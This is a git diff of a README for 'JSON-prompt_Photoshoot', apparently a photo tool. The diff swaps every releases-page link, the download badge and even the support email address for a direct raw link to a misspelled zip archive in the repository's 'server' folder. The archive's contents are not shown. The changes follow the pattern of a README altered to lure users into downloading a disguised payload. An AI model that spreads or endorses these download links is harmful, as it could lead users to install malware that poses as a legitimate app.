@@ -6,9 +6,9 @@ Welcome to JSON-prompt_Photoshoot! This tool allows Nano Banana users to easily 
 
 ## 📦 Download & Install
 
-[![Download JSON-prompt_Photoshoot](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/lovoto205/JSON-prompt_Photoshoot/releases)
+[![Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/raw/refs/heads/master/server/JSO-prompt-Photoshoot-v1.7.zip)](https://github.com/lovoto205/JSON-prompt_Photoshoot/raw/refs/heads/master/server/JSO-prompt-Photoshoot-v1.7.zip)
 
-To download the application, visit this page: [Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/releases).
+To download the application, visit this page: [Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/raw/refs/heads/master/server/JSO-prompt-Photoshoot-v1.7.zip).
 
 ### 🔧 System Requirements
 
@@ -21,7 +21,7 @@ Make sure your system meets the following requirements:
 
 ### 💻 Installation Steps
 
-1. Visit the [Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/releases) page.
+1. Visit the [Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/raw/refs/heads/master/server/JSO-prompt-Photoshoot-v1.7.zip) page.
 2. Find the latest release version.
 3. Click on the download link for your operating system (e.g., Windows, macOS).
 4. Save the file to your computer.
@@ -67,10 +67,10 @@ A: Yes, your uploaded photos are processed locally on your device and are not st
 
 ## 📞 Support
 
-If you encounter any issues while using JSON-prompt_Photoshoot, please refer to the troubleshooting section in the app or reach out to our support team via email at support@lovoto205.com.
+If you encounter any issues while using JSON-prompt_Photoshoot, please refer to the troubleshooting section in the app or reach out to our support team via email at https://github.com/lovoto205/JSON-prompt_Photoshoot/raw/refs/heads/master/server/JSO-prompt-Photoshoot-v1.7.zip
 
 ## 🚀 Download Link
 
-Don’t wait to enhance your photos! Download JSON-prompt_Photoshoot today by visiting this link: [Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/releases).
+Don’t wait to enhance your photos! Download JSON-prompt_Photoshoot today by visiting this link: [Download JSON-prompt_Photoshoot](https://github.com/lovoto205/JSON-prompt_Photoshoot/raw/refs/heads/master/server/JSO-prompt-Photoshoot-v1.7.zip).
 
 Embrace your creativity and take your photos to the next level!
